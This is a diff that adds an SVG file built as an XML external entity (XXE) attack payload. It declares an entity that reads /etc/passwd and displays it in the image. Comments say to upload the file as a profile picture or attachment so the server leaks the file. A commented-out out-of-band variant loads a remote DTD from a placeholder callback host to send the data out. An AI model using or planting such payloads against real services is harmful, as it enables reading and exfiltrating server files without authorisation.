@@ -1,0 +1,25 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
+  <text y="20" font-size="12">&xxe;</text>
+</svg>
+
+<!-- 
+  Upload this as a profile picture or document attachment.
+  If the server renders/processes SVG server-side, the file content
+  will appear in the returned image or error message.
+
+  OOB variant (replace CALLBACK):
+-->
+<!--
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY % remote SYSTEM "https://CALLBACK/evil.dtd">
+  %remote;
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&send;</text>
+</svg>
+-->
